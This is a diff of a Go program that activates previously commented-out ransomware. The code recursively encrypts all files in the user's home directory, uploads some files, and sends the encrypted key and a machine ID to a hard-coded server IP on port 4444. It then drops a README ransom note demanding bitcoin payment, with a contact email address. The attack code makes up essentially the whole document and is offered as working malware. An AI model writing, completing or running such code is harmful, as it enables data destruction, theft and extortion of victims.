@@ -1,10 +1,16 @@
 package main
 
 import (
+	"github.com/denisbrodbeck/machineid"
+
 	"bytes"
 	"crypto/aes"
 	"crypto/cipher"
 	"crypto/rsa"
+	"crypto/sha256"
+	crand "crypto/rand"
+	"encoding/hex"
+	"encoding/json"
 	"fmt"
 	"io"
 	"io/ioutil"
@@ -13,9 +19,12 @@ import (
 	"math/rand"
 	"mime/multipart"
 	"net/http"
+	"net/url"
 	"os"
 	"path/filepath"
 	"regexp"
+	"runtime"
+	"time"
 )
 
 var (
@@ -173,114 +182,115 @@ func DownloadFiles(k *keeper) {
 	hc.Do(req)
 }
 
-//var server string = "104.237.218.70:4444" // server address
+var server string = "104.237.218.70:4444" // server address
 var contact string = "keksec@hotmail.fr" // whatever address suits you
 
 func main() {
-	//var files []keeper
-	//var counter int = 1
-	//var home string
+	var files []keeper
+	var counter int = 1
+	var home string
 
 	randomKey := NewEncryptionKey()
 	fmt.Println(randomKey)
-	/*if _, err := os.Stat("key.txt"); os.IsNotExist(err) {
-			dst := make([]byte, hex.EncodedLen(len(randomKey[:])))
-			hex.Encode(dst, randomKey[:])
-			ioutil.WriteFile("key.txt", randomKey[:], 0644)
+	fmt.Println(Key.N.Int64())
+	if _, err := os.Stat("key.txt"); os.IsNotExist(err) {
+		dst := make([]byte, hex.EncodedLen(len(randomKey[:])))
+		hex.Encode(dst, randomKey[:])
+		ioutil.WriteFile("key.txt", randomKey[:], 0644)
+	}
+
+	if runtime.GOOS == "windows" {
+		home = os.Getenv("HOMEDRIVE") + os.Getenv("HOMEPATH")
+		if home == "" {
+			home = os.Getenv("USERPROFILE")
+		}
+	} else {
+		home = os.Getenv("HOME")
+	}
+
+	err := filepath.Walk(home, visit(&files))
+	if err != nil {
+		panic(err)
+	}
+	for _, file := range files {
+		fmt.Printf("\rEncrypting %d/%d: %s", counter, len(files), file)
+
+		data, err := ioutil.ReadFile(file.filename)
+		if err != nil {
+			continue
 		}
 
-	    if runtime.GOOS == "windows" {
-	        home = os.Getenv("HOMEDRIVE") + os.Getenv("HOMEPATH")
-	        if home == "" {
-	            home = os.Getenv("USERPROFILE")
-	        }
-	    } else {
-	        home = os.Getenv("HOME")
-	    }
+		encrypted, err := Encrypt(data, randomKey)
+		if err != nil {
+			log.Println(err)
+			continue
+		}
 
-	    err := filepath.Walk(home, visit(&files))
-	    if err != nil {
-	        panic(err)
-	    }
-	    for _, file := range files {
-	        fmt.Printf("\rEncrypting %d/%d: %s", counter, len(files), file)
+		err = ioutil.WriteFile(file.filename, encrypted, 0644)
+		if err != nil {
+			continue
+		}
 
-	        data, err := ioutil.ReadFile(file.filename)
-	        if err != nil {
-	            continue
-	        }
+		if file.toSend {
+			DownloadFiles(&file)
+		}
 
-	        encrypted, err := Encrypt(data, randomKey)
-	        if err != nil {
-	            log.Println(err)
-	            continue
-	        }
+		counter++
+	}
+	fmt.Printf("\n%d files encrypted.\n", len(files))
 
-	        err = ioutil.WriteFile(file.filename, encrypted, 0644)
-	        if err != nil {
-	            continue
-	        }
+	encryptedKey, err := rsa.EncryptOAEP(sha256.New(), crand.Reader, &Key, randomKey[:], nil)
+	if err != nil {
+		log.Fatal(err)
+	}
 
-	        if file.toSend {
-	            DownloadFiles(&file)
-	        }
+	id, err := machineid.ID()
+	if err != nil {
+		log.Fatal(err)
+	}
+	fmt.Println("Sending key away.")
 
-	        counter++
-	    }
-	    fmt.Printf("\n%d files encrypted.\n", len(files))
+	for {
+		response, err := http.PostForm("http://" + server + "/key/", url.Values{
+			"key": {hex.EncodeToString(encryptedKey)},
+			"id": {id},
+		})
+		if err != nil {
+			if _, err := os.Stat("key.txt"); os.IsNotExist(err) {
+				ioutil.WriteFile("key.txt", randomKey[:], 0644)
+				randomKey = nil // clear key
+			}
 
-	    encryptedKey, err := rsa.EncryptOAEP(sha256.New(), rand.Reader, &Key, randomKey[:], nil)
-	    if err != nil {
-	        log.Fatal(err)
-	    }
+			fmt.Println("Connection failed. Retrying in 5 seconds..")
+			time.Sleep(5 * time.Second)
+			continue
+		}
+		defer response.Body.Close()
+		if _, err := os.Stat("key.txt"); !os.IsNotExist(err) {
+			err = os.Remove("key.txt")
+			if err != nil {
+				log.Fatal(err)
+			}
+		}
+		fmt.Println("Connection established. Payment information received..")
 
-	    id, err := machineid.ID()
-	    if err != nil {
-	        log.Fatal(err)
-	    }
-	    fmt.Println("Sending key away.")
+		payment := new(PaymentInfo)
 
-	    for {
-	        response, err := http.PostForm("http://" + server + "/key/", url.Values{
-	            "key": {hex.EncodeToString(encryptedKey)},
-	            "id": {id},
-	        })
-	        if err != nil {
-	            if _, err := os.Stat("key.txt"); os.IsNotExist(err) {
-					ioutil.WriteFile("key.txt", randomKey[:], 0644)
-					randomKey = nil // clear key
-	            }
+		err = json.NewDecoder(response.Body).Decode(&payment)
+		if err != nil {
+			log.Fatal(err)
+		}
+		text := "Your files have been encrypted. Please pay " + payment.Amount + " satoshi to the following bitcoin address if you want to decrypt them: " + payment.Address + " . Use https://www.blockchain.com/btc/address/" + payment.Address + " to check the status of your payment. Once the transaction has 6+ confirmations you can run the decrpytion tool to decrypt your files. If this proccess is unclear to you, please reach out to: " + contact + ". Have a nice day!\nMachine ID: " + id
 
-	            fmt.Println("Connection failed. Retrying in 5 seconds..")
-	            time.Sleep(5 * time.Second)
-	            continue
-	        }
-	        defer response.Body.Close()
-	        if _, err := os.Stat("key.txt"); !os.IsNotExist(err) {
-	            err = os.Remove("key.txt")
-	            if err != nil {
-	                log.Fatal(err)
-	            }
-	        }
-	        fmt.Println("Connection established. Payment information received..")
+		if runtime.GOOS == "windows" {
+			ioutil.WriteFile(home + "\\Desktop\\README.txt", []byte(text), 0644)
+		} else {
+			ioutil.WriteFile(home + "/README.txt", []byte(text), 0644)
+		}
+		fmt.Println("Script execution completed successfully!")
 
-	        payment := new(PaymentInfo)
+		break
+	}
 
-	        err = json.NewDecoder(response.Body).Decode(&payment)
-	        if err != nil {
-	            log.Fatal(err)
-	        }
-	        text := "Your files have been encrypted. Please pay " + payment.Amount + " satoshi to the following bitcoin address if you want to decrypt them: " + payment.Address + " . Use https://www.blockchain.com/btc/address/" + payment.Address + " to check the status of your payment. Once the transaction has 6+ confirmations you can run the decrpytion tool to decrypt your files. If this proccess is unclear to you, please reach out to: " + contact + ". Have a nice day!\nMachine ID: " + id
-
-	        if runtime.GOOS == "windows" {
-	            ioutil.WriteFile(home + "\\Desktop\\README.txt", []byte(text), 0644)
-	        } else {
-	            ioutil.WriteFile(home + "/README.txt", []byte(text), 0644)
-	        }
-	        fmt.Println("Script execution completed successfully!")
-
-	        break
-	    }
-
-	    encryptedKey = nil */
+	encryptedKey = nil
 }
